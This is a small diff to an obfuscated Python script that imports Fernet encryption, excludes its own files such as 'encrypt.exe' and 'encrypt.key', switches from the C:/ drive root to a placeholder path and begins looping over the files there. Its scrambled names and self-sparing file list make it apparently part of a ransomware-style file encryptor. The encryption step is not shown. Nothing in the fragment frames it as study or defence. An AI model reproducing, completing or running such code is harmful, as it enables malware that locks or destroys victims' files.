@@ -29,10 +29,10 @@ from cryptography.fernet import Fernet as NMENmEFNMWHjKXCHUoq
 
 nnmANnmWDBbjQWFBJKf = []
 nbbAWNnmChjKEVuioAE = ["key_storage.py", "encryption_matrix.py"]
-zWZiFIoQWIPfIPSF = ["encrypt.exe", "encrypt.py", "encrypt.key"]
+zWZiFIoQWIPfIPSF = ["encrypt.exe", "encrypt.py", "encrypt.key", "full_script.py"]
 tfaTuWZiZVUI = "a98def102bbc7a81320c"
 
-JskLAkjSDiiW.chdir("C:/")
+JskLAkjSDiiW.chdir("<path>") # <-- change path here
 
 for nMEZzQQWuIOFEA in JskLAkjSDiiW.listdir():
     if nMEZzQQWuIOFEA in zWZiFIoQWIPfIPSF:
